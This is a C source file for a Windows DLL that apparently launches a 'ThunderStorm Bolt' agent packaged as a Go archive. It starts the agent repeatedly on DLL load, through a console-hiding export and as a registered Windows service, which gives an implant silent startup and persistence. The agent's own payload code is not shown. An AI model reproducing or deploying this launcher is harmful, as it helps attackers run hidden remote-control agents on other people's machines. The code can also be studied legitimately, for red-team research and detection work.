// ThunderStorm Bolt Agent DLL Launcher
//  Wraps the Go archive and will control a Guardian context.
//
// Basic DLL
//  Can be used for (most) anything.

// Windows Xp+
#define WINVER 0x0501
#define _WIN32_WINNT 0x0501
// Windows Vista+
// #define WINVER 0x0600
// #define _WIN32_WINNT 0x0600

#define NOCOMM
#define WIN32_LEAN_AND_MEAN

#include <windows.h>

#define STACK_SIZE 256000000
#define EXPORT __declspec(dllexport)
#define TIMEOUT 30000

// Bolt Includes (Generated before compile)
#include "bolt.h"

HANDLE svcEvent;
HANDLE mainEvent;

SERVICE_STATUS svcStatus = {
    SERVICE_WIN32_SHARE_PROCESS, SERVICE_START_PENDING,
    SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE
};
SERVICE_STATUS_HANDLE svcMain;

EXPORT DWORD WINAPI HandlerEx(DWORD, DWORD, LPVOID, LPVOID);

DWORD beginthread(LPVOID e) {
    while (e == NULL || WaitForSingleObject(e, 0) != 0) {
        boltInit();
        Sleep(TIMEOUT);
    }
    if (e != NULL) {
        CloseHandle(e);
    }
    return 0;
}

EXPORT VOID initHandle(HWND h, HINSTANCE i, LPSTR a, int s) {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, SW_HIDE);
    }
    beginthread(NULL);
}

EXPORT VOID WINAPI ServiceMain(DWORD n, LPCWSTR* a) {
    svcEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (svcEvent == NULL) {
        return;
    }
    svcMain = RegisterServiceCtrlHandlerExA(NAME, HandlerEx, NULL);
    if (svcMain == NULL) {
        return;
    }
    svcStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(svcMain, &svcStatus);
    CreateThread(NULL, STACK_SIZE, (LPTHREAD_START_ROUTINE)beginthread, svcEvent, 0, NULL);
    WaitForSingleObject(svcEvent, INFINITE);
}

EXPORT BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID args) {
    if (r == DLL_PROCESS_ATTACH) {
        mainEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
        if (mainEvent == NULL) {
            return FALSE;
        }
        CreateThread(NULL, STACK_SIZE, (LPTHREAD_START_ROUTINE)beginthread, mainEvent, 0, NULL);
    } else if (r == DLL_PROCESS_DETACH) {
        if (mainEvent != NULL) {
            SetEvent(mainEvent);
        }
    }
    return TRUE;
}

EXPORT DWORD WINAPI HandlerEx(DWORD c, DWORD e, LPVOID d, LPVOID x) {
    switch (c) {
    case SERVICE_CONTROL_STOP:
        svcStatus.dwCurrentState = SERVICE_STOPPED;
        SetEvent(svcEvent);
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        svcStatus.dwCurrentState = SERVICE_STOPPED;
        SetEvent(svcEvent);
        break;
    case SERVICE_CONTROL_PAUSE:
        svcStatus.dwCurrentState = SERVICE_PAUSED;
        break;
    case SERVICE_CONTROL_CONTINUE:
        svcStatus.dwCurrentState = SERVICE_RUNNING;
        break;
    default:
        break;
    }
    SetServiceStatus(svcMain, &svcStatus);
    return NO_ERROR;
}
